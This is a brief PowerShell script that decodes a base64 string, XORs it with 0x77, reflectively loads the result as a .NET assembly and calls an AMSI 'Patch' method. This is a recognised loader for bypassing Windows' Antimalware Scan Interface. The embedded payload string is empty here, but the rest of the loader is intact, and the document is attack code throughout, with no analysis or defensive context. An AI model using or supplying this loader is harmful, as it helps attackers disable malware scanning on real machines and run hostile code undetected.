$encodeStr = ""

$decodeStr = [System.Convert]::FromBase64String($encodeStr)

for ($i = 0; $i -lt $decodeStr.Length; $i++){$decodeStr[$i] = $decodeStr[$i] -bxor 0x77}

[System.Reflection.Assembly]::Load($decodeStr)

[AMSI.Program]::Patch()
